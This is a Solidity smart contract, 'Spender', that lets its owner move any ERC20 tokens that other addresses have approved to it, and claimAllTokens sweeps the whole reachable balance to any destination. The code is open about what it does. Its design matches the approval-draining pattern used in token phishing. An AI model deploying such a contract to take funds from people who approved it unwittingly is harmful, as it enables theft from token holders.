// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Spender
 * @dev A simple contract that can be set as spender for ERC20 tokens
 *      and allows the owner to transfer approved tokens
 */

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract Spender {
    address public owner;
    
    event TokensClaimed(address indexed token, address indexed from, address indexed to, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }
    
    /**
     * @dev Transfer approved tokens from a user to a destination
     * @param token The ERC20 token address
     * @param from The address to transfer from (must have approved this contract)
     * @param to The destination address
     * @param amount The amount to transfer
     */
    function claimTokens(
        address token,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid from address");
        require(to != address(0), "Invalid to address");
        require(amount > 0, "Amount must be > 0");
        
        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");
        
        bool success = IERC20(token).transferFrom(from, to, amount);
        require(success, "Transfer failed");
        
        emit TokensClaimed(token, from, to, amount);
    }
    
    /**
     * @dev Claim all approved tokens from a user
     * @param token The ERC20 token address
     * @param from The address to transfer from
     * @param to The destination address
     */
    function claimAllTokens(
        address token,
        address from,
        address to
    ) external onlyOwner {
        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance > 0, "No allowance");
        
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 amountToClaim = allowance < balance ? allowance : balance;
        
        require(amountToClaim > 0, "Nothing to claim");
        
        bool success = IERC20(token).transferFrom(from, to, amountToClaim);
        require(success, "Transfer failed");
        
        emit TokensClaimed(token, from, to, amountToClaim);
    }
    
    /**
     * @dev Check allowance for a token
     */
    function checkAllowance(address token, address user) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }
    
    /**
     * @dev Transfer ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
